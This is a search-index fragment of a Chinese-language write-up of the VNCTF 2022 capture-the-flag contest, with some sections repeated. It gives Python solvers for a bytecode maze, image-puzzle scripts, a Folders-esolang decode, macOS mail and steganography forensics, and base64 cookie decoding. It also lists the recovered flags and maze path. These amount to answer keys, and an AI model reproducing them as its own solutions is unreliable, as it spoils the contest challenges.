\u4e2a\u6ee1\u8db3 \\((2^n-1)\\equiv 0\\pmod{15}\\) \u7684 n\uff0c\u5e76\u4e14\u5728\u4e00\u5206\u949f\u4e4b\u5185\u56de\u7b54 777 \u6b21 \u53ef\u4ee5\u53d1\u73b0\u8fd9\u91cc\u7684 n \u4e00\u5b9a\u662f 4 \u7684\u500d\u6570\uff0c\u800c\u4e14\u662f\u5145\u8981\u7684\uff0c\u6240\u4ee5\u76f4\u63a5\u8bfb\u5165\u7136\u540e\u4e58 4 \u518d\u56de\u7b54\u5c31\u597d\u4e86 BabyMaze \u00b6 \u4e00\u9053 python \u7684 rev \u76f4\u63a5 uncompyle6 \u53d1\u73b0\u5361\u6b7b\uff0c\u7136\u540e marshal+dis \u8bfb\u53d6\u5b57\u8282\u7801\u53cd\u7f16\u8bd1 import dis import marshal with open ( \"BabyMaze.pyc\" , \"rb\" ) as f : code = marshal . loads ( f . read ()[ 16 :]) dis . dis ( code ) \u5f97\u5230\u5f00\u5934\uff1a 1 0 JUMP_ABSOLUTE 4 >> 2 JUMP_ABSOLUTE 6 >> 4 JUMP_ABSOLUTE 2 >> 6 LOAD_CONST 0 ( 1 ) ... 66 LOAD_CONST 0 ( 1 ) 68 BUILD_LIST 31 70 LOAD_CONST 0 ( 1 ) 72 LOAD_CONST 1 ( 5 ) 74 LOAD_CONST 0 ( 1 ) ... 130 LOAD_CONST 0 ( 1 ) 132 BUILD_LIST 31 ... ... 1862 LOAD_CONST 0 ( 1 ) 1864 LOAD_CONST 2 ( 0 ) ... 1920 LOAD_CONST 3 ( 7 ) 1922 LOAD_CONST 0 ( 1 ) 1924 BUILD_LIST 31 1926 LOAD_CONST 0 ( 1 ) ... 1986 LOAD_CONST 0 ( 1 ) 3 1988 BUILD_LIST 31 1990 BUILD_LIST 31 1992 STORE_NAME 0 ( _map ) \u7ed3\u5c3e\uff1a Disassembly of < code object main at 0x00000222A2AC4660 , file \".\\BabyMaze.py\" , line 23 > : 0 LOAD_GLOBAL 0 ( print ) 2 LOAD_CONST 1 ( 'Welcome To VNCTF2022!!!' ) 4 CALL_FUNCTION 1 6 POP_TOP 8 LOAD_GLOBAL 0 ( print ) 0 LOAD_CONST 2 ( 'Hello Mr. X, this time your mission is to get out of this maze this time.(FIND THAT 7!)' ) 2 CALL_FUNCTION 1 4 POP_TOP 6 LOAD_GLOBAL 0 ( print ) 8 LOAD_CONST 3 ( 'you are still doing the mission alone, this tape will self-destruct in five seconds.' ) 0 CALL_FUNCTION 1 2 POP_TOP 4 LOAD_GLOBAL 1 ( maze ) 6 CALL_FUNCTION 0 8 POP_JUMP_IF_FALSE 40 0 LOAD_GLOBAL 0 ( print ) 2 LOAD_CONST 4 ( 'Congratulation! flag: VNCTF{md5(your input)}' ) 4 CALL_FUNCTION 1 6 POP_TOP 8 JUMP_FORWARD 8 ( to 48 ) \u6240\u4ee5\u5927\u6982\u610f\u601d\u5c31\u662f\u6709\u4e00\u4e2a 31*31 \u5217\u8868\u6784\u6210\u7684 _map \u5730\u56fe\uff0c1 \u662f\u5899\uff0c0 \u53ef\u4ee5\u8d70\uff0c5 \u662f\u81ea\u5df1\uff0c\u8981\u5230\u8fbe 7 \u5e76\u4e14\u901a\u8fc7 wasd \u64cd\u7eb5\u65b9\u5411\uff0c\u5230\u8fbe 7 \u7684\u6240\u6709\u8f93\u5165\u518d md5 \u5c31\u662f flag \u6240\u4ee5\u76f4\u63a5\u6b63\u5219\u63d0\u53d6\u5217\u8868\uff0c\u7136\u540e\u6253\u5370\u51fa\u6765\u624b\u52a8\u505a\u4e00\u4e0b\u5c31\u597d import re with open ( \"maze.pyc\" , \"r\" ) as f : content = f . read () res = re . findall ( \"(?:LOAD_CONST.*?\\((\\d)\\))\" , content , re . S ) print ( res ) ptr = 0 for i in range ( 31 ): for j in range ( 31 ): if res [ ptr ] == \"1\" : print ( \"\u2588\" , end = \"\" ) else : print ( \" \" , end = \"\" ) ptr += 1 print () \u7ed3\u679c \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588 \u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588 \u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588\u2588\u2588 \u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588 \u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588\u2588\u2588 \u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588 \u2588\u2588\u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588 \u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 ssssddssaassddddwwwwddwwddddddwwddddddssddwwddddddddssssaawwaassaassaassddssaassaawwwwwwaaaaaaaassaassddddwwddssddssssaassddssssaaaaaawwddwwaawwwwaassssssssssssddddssddssddddddddwwaaaaaawwwwddssddwwwwwwwwddssddssssssssddddss VNCTF{801f190737434100e7d2790bd5b0732e} \u4ed4\u7ec6\u627e\u627e \u00b6 \u9898\u76ee \u5f88\u660e\u663e\u80fd\u53d1\u73b0\u6709\u50cf\u7d20\u683c\u70b9\uff0c\u5e76\u4e14\u6709\u4e00\u4e9b\u989c\u8272\u4e0d\u4e00\u6837\uff0c\u53ef\u80fd\u662f flag \u4e8e\u662f\u6253\u7b97\u63d0\u53d6\u51fa\u6240\u6709\u683c\u70b9\uff0c\u4f46\u662f\u597d\u50cf\u662f\u5206\u5757\u7684\uff0c\u4e0d\u80fd\u4e00\u6b21\u6027\u5b8c\u6574\u63d0\u53d6 \u4e8e\u662f\u5c31\u8089\u773c\u786c\u770b\uff0c\u5f97\u5230 flag\uff1a vnctf{34aE@w} \u770b\u4e86 wp\uff0c\u662f\u7f29\u653e\u5927\u5c0f\u91cd\u65b0\u91c7\u6837\uff1a from PIL import Image img = Image . open ( \"flag.png\" ) img = img . resize (( 79 , 71 ), Image . NEAREST ) img . show () \u5c31\u80fd\u6e05\u6670\u770b\u5230 flag \u4e86 Strange flag \u00b6 \u4e00\u4e2a\u6d41\u91cf\u5305\uff0cwireshark \u6253\u5f00\uff0c\u8ffd\u8e2a\u6700\u540e\u4e00\u4e2a TCP \u6d41 \u8bfb\u4e00\u4e0b\u8bf7\u6c42\uff0c\u53d1\u73b0\u662f\u8fdb\u5165\u5230\u4e86 flag \u76ee\u5f55\u4e0b\u6267\u884c\u4e86 tree \u547d\u4ee4 \u5f97\u5230\u7684 response \u662f gzip \u538b\u7f29\u540e\u7684\uff0c\u53d6\u51fa\u5185\u5bb9\uff0c\u7136\u540e\u89e3\u538b\u5f97\u5230 tree \u7684\u7ed3\u679c\uff1a flag `-- New\\ folder |-- New\\ folder | |-- New\\ folder | |-- New\\ folder\\ (2) | |-- New\\ folder\\ (3) | `-- New\\ folder\\ (4) `-- New\\ folder\\ (2) |-- New\\ Folder\\ (3) | |-- New\\ folder | | |-- New\\ folder | | | |-- New\\ folder | | | |-- New\\ folder(2) | | | | `-- New\\ folder | | | |-- New\\ folder(3) | | | | `-- New\\ folder | | | `-- New\\ folder(4) | | | `-- New\\ folder | | `-- New\\ folder(2) | | |-- New\\ folder | | |-- New\\ folder(2) | | | `-- New\\ folder | | |-- New\\ folder(3) | | | `-- New\\ folder | | `-- New\\ folder(4) | |-- New\\ folder(10) ... \u4e0d\u96be\u53d1\u73b0\uff0c\u662f\u4e00\u5806\u7a7a\u6587\u4ef6\u5939\u5f62\u6210\u7684\u7ed3\u6784 \u7136\u540e\u5c31\u56de\u60f3\u8d77\u4e86\u4e4b\u524d\u770b\u5230\u7684\u4e00\u79cd esolang \u53eb Folders\uff0c\u662f\u901a\u8fc7\u4e00\u5806\u5d4c\u5957\u7684\u7a7a\u6587\u4ef6\u5939\u7f16\u5199\u7684\uff0c\u8fd9\u4e2a\u53ef\u80fd\u5c31\u662f \u5148\u91cd\u5efa\u8d77\u8fd9\u4e2a\u76ee\u5f55\u7ed3\u6784\uff0c\u6ca1\u627e\u5230\u9006 tree \u7684\u73b0\u6210\u5de5\u5177\uff0c\u53ea\u597d\u624b\u5199\u4e00\u4e2a\u4e86\uff1a import os from pathlib import Path with open ( \"test\" , \"r\" ) as f : tree = f . readlines () path = Path ( \"flag\" ) last_level = - 1 for each in tree : level = each . find ( \"N\" ) // 4 if level < last_level : path = path . parent if level == last_level : path = path . parent diff = last_level - level for _ in range ( diff ): path = path . parent path = path / each . strip () . replace ( \" \\\\ \" , \"\" ) last_level = level os . makedirs ( path ) \u67e5\u4e86\u4e0b\uff0cFolders \u6709\u5de5\u5177\uff0cpip install Folders\uff0c\u7136\u540e Folders flag/\uff0c\u5f97\u5230 flag\uff1a vnctf{d23903879df57503879bcdf1efc141fe} prize wheel \u00b6 \u5dee\u4e00\u70b9\uff0c\u6700\u540e\u7684\u56fe\u7247\u9006\u8fc7\u53bb\u7684\u601d\u8def\u5b8c\u5168\u9519\u4e86 \u9996\u5148\u7ed9\u4e86\u4e00\u4e2a exe\uff0c\u5f00\u59cb\u4e5f\u6ca1\u610f\u8bc6\u5230\u8fd9\u4e2a\u662f\u62bd\u5956\uff0c\u89c4\u5219\u4e5f\u6ca1\u770b\uff0c\u968f\u4fbf\u8dd1\u4e86\u8dd1\u5c31\u62ff\u5230\u4e86\u538b\u7f29\u5305\u5bc6\u7801 f6a623a2c577de3b46c079267d4bdd6e \u518d\u7ec6\u770b\u53d1\u73b0\u662f 0.5% \u7684\u6982\u7387\u80fd\u62bd\u5230\u5bc6\u7801\uff0c\u9884\u671f\u662f\u81ea\u52a8\u5316\u62bd\u5956\u6216\u8005\u9006\u5411\uff0c\u7ed3\u679c\u6211\u4e09\u6b21\u5c31\u62bd\u51fa\u6765\u4e86\uff1f\uff1f\uff08\u6b27\u5728\u4e86\u4e0d\u9700\u8981\u7684\u5730\u65b9.jpg\uff09 \u5145\u6ee1\u5e0c\u671b\u7684\u5f71\u50cf\uff08 \u538b\u7f29\u5305\u89e3\u5f00\u4e4b\u540e\u5f97\u5230\u53e6\u4e00\u4e2a\u56fe\u7247 \u9898\u76ee \u5f88\u660e\u663e\u5e94\u8be5\u662f\u4e00\u5f20\u56fe\u7247\u63d0\u53d6\u51fa\u4e86\u6240\u6709\u50cf\u7d20\u70b9\uff0c\u7136\u540e\u86c7\u5f62\u91cd\u65b0\u6392\u5217\u5f62\u6210\u8fd9\u5f20\u56fe\u7247 \u9898\u76ee hint \u4e5f\u8bf4\u4e86\u5b58\u5728\u53ef\u4ee5\u5b9a\u4f4d\u7684\u4e1c\u897f\uff0c\u80af\u5b9a\u662f\u90a3\u4e9b\u767d\u70b9 \u4f46\u662f\u6211\u7684\u5199\u6cd5\u600e\u4e48\u6837\u90fd\u4e0d\u4f1a\u8ba9\u8fd9\u4e9b\u5bf9\u5728\u4e00\u8d77 \u6211\u7684\u60f3\u6cd5\u662f\u86c7\u5f62\u63d0\u53d6\u51fa\u6240\u6709\u50cf\u7d20\u70b9\uff0c\u7136\u540e\u6309\u7167\u987a\u5e8f\u4ece\u4e0a\u5230\u4e0b\u4ece\u5de6\u5230\u53f3\u586b\u5165 \u6211\u7684\u5199\u6cd5 from PIL import Image from tqdm import tqdm import sys img = Image . open ( \"flag.png\" ) width , height = img . size res = Image . new ( \"RGBA\" , ( 1220 , 1220 )) lst = [] for i in range ( width // 2 + 1 ): for j in range ( i , width - i ): lst . append ( img . getpixel (( i , j ))) for j in range ( i + 1 , width - i ): lst . append ( img . getpixel (( j , width - i - 1 ))) for j in range ( width - i - 2 , i , - 1 ): lst . append ( img . getpixel (( width - i - 1 , j ))) for j in range ( width - i - 1 , i , - 1 ): lst . append ( img . getpixel (( j , i ))) lst = lst [:: - 1 ] with tqdm ( total = 600 ) as pbar : for times in range ( 600 ): ptr = 0 res = Image . new ( \"RGBA\" , ( 610 , 1221 )) for j in range ( 1220 ): for i in range ( width - times ): try : res . putpixel (( i , j ), lst [ ptr ]) ptr += 1 except : pass pbar . update ( 1 ) res . save ( f \"res/- { times } .png\" ) \u6362\u4e86\u597d\u591a\u79cd\u987a\u5e8f\uff0c\u5bfc\u51fa\u4e86\u4e00\u5343\u591a\u5f20\u56fe\u7247\u4e5f\u6ca1\u6709\u957f\u5f97\u597d\u770b\u7684 \u770b\u4e86 wp\uff0c\u77e5\u9053\u4e86\u6bcf\u4e00\u4e2a\u6b63\u65b9\u5f62\u7684\u5708\u4e0a\u90fd\u6709\u4e00\u4e2a\u767d\u8272\u7684\u70b9\uff0c\u8981\u65cb\u8f6c\u6bcf\u4e00\u5708\uff0c\u8ba9\u767d\u8272\u7684\u70b9\u5bf9\u6210\u4e00\u6761\u7ebf \u6240\u4ee5\u9700\u8981\u5199\u811a\u672c\u6765\u65cb\u8f6c\u6bcf\u4e00\u4e2a\u6b63\u65b9\u5f62\u7684\u5708\u76f4\u5230\u5bf9\u9f50\uff1a \u6b63\u89e3 from PIL import Image img = Image . open ( 'flag.png' ) width , height = img . size c_x = width // 2 c_y = height // 2 for count in range ( 3 , width + 1 , 2 ): print ( count ) d = count // 2 for i in range (( count - 1 ) * 4 ): p_x = c_x - d p_y = c_y - d tmp0 = img . getpixel (( width // 2 , c_y - count // 2 )) if tmp0 [ 0 ] == 255 and tmp0 [ 1 ] == 255 and tmp0 [ 2 ] == 255 : break tmp = img . getpixel (( p_x , p_y )) for j in range ( count - 1 ): img . putpixel (( p_x , p_y ), ( img . getpixel (( p_x + 1 , p_y )))) p_x += 1 for j in range ( count - 1 ): img . putpixel (( p_x , p_y ), ( img . getpixel (( p_x , p_y + 1 )))) p_y += 1 for j in range ( count - 1 ): img . putpixel (( p_x , p_y ), ( img . getpixel (( p_x - 1 , p_y )))) p_x -= 1 for j in range ( count - 2 ): img . putpixel (( p_x , p_y ), ( img . getpixel (( p_x , p_y - 1 )))) p_y -= 1 img . putpixel (( p_x , p_y ), tmp ) img . save ( \"trueflag.png\" ) simple macos \u00b6 \u4e5f\u662f\u5dee\u4e00\u70b9\uff0c\u770b\u9519\u9690\u5199\u7684\u56fe\u7247\u6587\u4ef6\u4e86\uff0c\u505a\u4e86\u534a\u5929\u505a\u4e0d\u51fa\u6765 macOS \u53d6\u8bc1\uff0c\u7ed9\u7684\u538b\u7f29\u5305\u662f System \u548c Users \u6587\u4ef6\u5939\u7684\u4e00\u90e8\u5206 \u5168\u5c40\u641c\u7d22 flag\uff0c\u53d1\u73b0 /Users/scr1pt/Librarys/Mail/V9/.../[Gmail].mbox/\u5df2\u5220\u9664\u90ae\u4ef6.mbox/ \u4e2d\u6709\u4e00\u4e2a 603.emlx \u6587\u4ef6\uff0c\u662f\u4e00\u5c01\u5220\u9664\u6389\u7684\u90ae\u4ef6 \u7528 mac \u90ae\u4ef6\u5ba2\u6237\u7aef\u5c31\u80fd\u76f4\u63a5\u6253\u5f00\uff1a \u7136\u540e\u53bb\u627e\u8bf4\u7684 profile picture\uff0c\u53d1\u73b0\u6709\u4e09\u4e2a\u6587\u4ef6\u91cc\u6709\u7c7b\u4f3c\u56fe\u7247\u7684 base64: /System/Volumes/Preboot/79FABCCE-3636-4266-A6CF-8E3BB40332B4/var/db/CryptoUserInfo.plist /System/Volumes/Preboot/79FABCCE-3636-4266-A6CF-8E3BB40332B4/System/Library/Caches/com.apple.corestorage/EncryptedRoot.plist.wipekey /System/Volumes/Preboot/79FABCCE-3636-4266-A6CF-8E3BB40332B4/var/db/AllUsersInfo.plist \u7b2c\u4e00\u4e2a\u662f\u82b1\u56ed\u5b9d\u5b9d\u7684\u4e00\u4e2a\u89d2\u8272 jpeg \u56fe\u7247\uff0c\u7b2c\u4e8c\u4e2a\u662f\u4e00\u6735\u8377\u82b1\u7684 tiff \u56fe\u7247\uff0c\u7b2c\u4e09\u4e2a\u662f\u4e00\u4e2a\u538b\u7f29\u5305\uff0c\u89e3\u538b\u4e4b\u540e\u6709\u4e00\u5806\u8377\u82b1\u56fe\u7247\u7684\u4e0d\u540c\u6837\u5f0f\uff08\u5927\u5c0f\u8fb9\u6846\u6587\u5b57\u4e4b\u7c7b\uff09 \u7136\u540e\u6211\u5c31\u53bb\u770b\u90a3\u4e2a tiff \u4e86\uff0c\u4ec0\u4e48\u90fd\u770b\u4e0d\u51fa\u6765 \u770b\u4e86 wp\uff0c\u662f\u5728\u7b2c\u4e00\u4e2a\u56fe\u7247\u4e2d\u9690\u85cf\u7684\u4fe1\u606f \u6587\u4ef6\u672b\u5c3e\u6709\u4e00\u4e32 flag \u7684\u7ed3\u5c3e nsllc_1s_s1MMple} \uff08\u4e0d\u592a\u786e\u5b9a\uff09 \u7136\u540e\u518d\u53bb\u6389\u8fd9\u4e00\u4e32\uff0c\u653e\u5230 Our Secret \u4e2d\u8bfb\u53d6\uff0c\u5f31\u5bc6\u7801 123456\uff0c\u5f97\u5230\u524d\u534a\u90e8\u5206 flag: VNCTF{Macos_Fore","title":"VNCTF 2022"},{"location":"writeups/vnctf2022/#vnctf-2022-writeup","text":"Abstract \u5bd2\u5047\u91cc\u7684\u4e00\u573a\u4e2a\u4eba\u8d5b\uff0c\u968f\u4fbf\u6253\u7740\u73a9\u4e86\u73a9\uff0c\u505a\u4e86\u51e0\u4e2a misc\uff0c\u548c\u50cf misc \u7684 web/rev/crypto\uff0c\u6392\u4e86 35 \u6709\u51e0\u9053\u9898\u5dee\u70b9\u5c31\u80fd\u505a\u51fa\u6765\uff0c\u8fd9\u91cc\u4e5f\u90fd\u5199\u4e0b\u6765\u4e86 VNCTF 2022 Official WriteUp","title":"VNCTF 2022 Writeup"},{"location":"writeups/vnctf2022/#gamev40","text":"web \u7c7b\u578b\u7684\u7b7e\u5230\u9898 \u5f00\u59cb\u8fd8\u53bb\u8ba4\u771f\u5730\u73a9\u4e86\u8fd9\u4e2a\u6e38\u620f\uff0c\u7136\u540e\u6253\u5b8c flag \u5173\u4e5f\u6ca1\u6709\u770b\u5230 flag\uff0c\u5c31\u53bb\u7ffb\u4e86\u6e90\u7801 \u53d1\u73b0\u4e86 data.js \u8fd9\u4e2a\u6587\u4ef6\u4fdd\u5b58\u4e86\u6240\u6709\u5173\u5361\u7684\u6570\u636e\uff0c\u7136\u540e\u5728\u6587\u4ef6\u7684\u6700\u672b\u5c3e\u6709\u4e00\u884c \"ZmxhZw==\" : \"Vk5DVEYlN0JXZWxjb21lX3RvX1ZOQ1RGMjAyMiU3RA==\" base64 \u89e3\u7801\uff0c\u7136\u540e URL \u89e3\u7801\uff0c\u5f97\u5230\uff1aflag: VNCTF{Welcome_to_VNCTF2022}","title":"GameV4.0"},{"location":"writeups/vnctf2022/#gocalc0","text":"\u770b\u6837\u5b50\u662f\u975e\u9884\u671f\u4e86 \u70b9\u8fdb flag \u5728\u8fd9\u91cc\uff0c\u91cc\u9762\u8bf4 flag is in your session\uff0c\u6253\u5f00 cookies \u53d1\u73b0\uff1a session: MTY0NDk4ODEyMnxEdi1CQkFFQ180SUFBUkFCRUFBQVNQLUNBQUVHYzNSeWFXNW5EQVlBQkVaTVFVY0djM1J5YVc1bkRDd0FLbVpzWVdkN01EWXlZamcyWlRNdE1tSTFNaTAwTURFMUxUZzJNall0TjJFNVkyVTVORFV4TldZMGZRPT18sud3sUmK5woUfaXQnzZ_R_eu8wGDMVPjfgXvyKo99os= base64 \u89e3\u7801\u540e\u53d1\u73b0\u91cc\u9762\u8fd8\u6709\u4e00\u6bb5 base64\uff0c\u7ee7\u7eed\u89e3\u7801\uff0c\u5c31\u6709 flag \u4e86\uff1a flag{062b86e3-2b52-4015-8626-7a9ce94515f4}","title":"gocalc0"},{"location":"writeups/vnctf2022/#ezmath","text":"\u4e00\u9053\u6ca1\u4ec0\u4e48\u542b\u91d1\u91cf\u7684 crypto \u9898\u76ee\u95ee\u7b2c x \u4e2a\u6ee1\u8db3 \\((2^n-1)\\equiv 0\\pmod{15}\\) \u7684 n\uff0c\u5e76\u4e14\u5728\u4e00\u5206\u949f\u4e4b\u5185\u56de\u7b54 777 \u6b21 \u53ef\u4ee5\u53d1\u73b0\u8fd9\u91cc\u7684 n \u4e00\u5b9a\u662f 4 \u7684\u500d\u6570\uff0c\u800c\u4e14\u662f\u5145\u8981\u7684\uff0c\u6240\u4ee5\u76f4\u63a5\u8bfb\u5165\u7136\u540e\u4e58 4 \u518d\u56de\u7b54\u5c31\u597d\u4e86","title":"ezmath"},{"location":"writeups/vnctf2022/#babymaze","text":"\u4e00\u9053 python \u7684 rev \u76f4\u63a5 uncompyle6 \u53d1\u73b0\u5361\u6b7b\uff0c\u7136\u540e marshal+dis \u8bfb\u53d6\u5b57\u8282\u7801\u53cd\u7f16\u8bd1 import dis import marshal with open ( \"BabyMaze.pyc\" , \"rb\" ) as f : code = marshal . loads ( f . read ()[ 16 :]) dis . dis ( code ) \u5f97\u5230\u5f00\u5934\uff1a 1 0 JUMP_ABSOLUTE 4 >> 2 JUMP_ABSOLUTE 6 >> 4 JUMP_ABSOLUTE 2 >> 6 LOAD_CONST 0 ( 1 ) ... 66 LOAD_CONST 0 ( 1 ) 68 BUILD_LIST 31 70 LOAD_CONST 0 ( 1 ) 72 LOAD_CONST 1 ( 5 ) 74 LOAD_CONST 0 ( 1 ) ... 130 LOAD_CONST 0 ( 1 ) 132 BUILD_LIST 31 ... ... 1862 LOAD_CONST 0 ( 1 ) 1864 LOAD_CONST 2 ( 0 ) ... 1920 LOAD_CONST 3 ( 7 ) 1922 LOAD_CONST 0 ( 1 ) 1924 BUILD_LIST 31 1926 LOAD_CONST 0 ( 1 ) ... 1986 LOAD_CONST 0 ( 1 ) 3 1988 BUILD_LIST 31 1990 BUILD_LIST 31 1992 STORE_NAME 0 ( _map ) \u7ed3\u5c3e\uff1a Disassembly of < code object main at 0x00000222A2AC4660 , file \".\\BabyMaze.py\" , line 23 > : 0 LOAD_GLOBAL 0 ( print ) 2 LOAD_CONST 1 ( 'Welcome To VNCTF2022!!!' ) 4 CALL_FUNCTION 1 6 POP_TOP 8 LOAD_GLOBAL 0 ( print ) 0 LOAD_CONST 2 ( 'Hello Mr. X, this time your mission is to get out of this maze this time.(FIND THAT 7!)' ) 2 CALL_FUNCTION 1 4 POP_TOP 6 LOAD_GLOBAL 0 ( print ) 8 LOAD_CONST 3 ( 'you are still doing the mission alone, this tape will self-destruct in five seconds.' ) 0 CALL_FUNCTION 1 2 POP_TOP 4 LOAD_GLOBAL 1 ( maze ) 6 CALL_FUNCTION 0 8 POP_JUMP_IF_FALSE 40 0 LOAD_GLOBAL 0 ( print ) 2 LOAD_CONST 4 ( 'Congratulation! flag: VNCTF{md5(your input)}' ) 4 CALL_FUNCTION 1 6 POP_TOP 8 JUMP_FORWARD 8 ( to 48 ) \u6240\u4ee5\u5927\u6982\u610f\u601d\u5c31\u662f\u6709\u4e00\u4e2a 31*31 \u5217\u8868\u6784\u6210\u7684 _map \u5730\u56fe\uff0c1 \u662f\u5899\uff0c0 \u53ef\u4ee5\u8d70\uff0c5 \u662f\u81ea\u5df1\uff0c\u8981\u5230\u8fbe 7 \u5e76\u4e14\u901a\u8fc7 wasd \u64cd\u7eb5\u65b9\u5411\uff0c\u5230\u8fbe 7 \u7684\u6240\u6709\u8f93\u5165\u518d md5 \u5c31\u662f flag \u6240\u4ee5\u76f4\u63a5\u6b63\u5219\u63d0\u53d6\u5217\u8868\uff0c\u7136\u540e\u6253\u5370\u51fa\u6765\u624b\u52a8\u505a\u4e00\u4e0b\u5c31\u597d import re with open ( \"maze.pyc\" , \"r\" ) as f : content = f . read () res = re . findall ( \"(?:LOAD_CONST.*?\\((\\d)\\))\" , content , re . S ) print ( res ) ptr = 0 for i in range ( 31 ): for j in range ( 31 ): if res [ ptr ] == \"1\" : print ( \"\u2588\" , end = \"\" ) else : print ( \" \" , end = \"\" ) ptr += 1 print () \u7ed3\u679c \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588 \u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588\u2588\u2588 \u2588 \u2588 \u2588 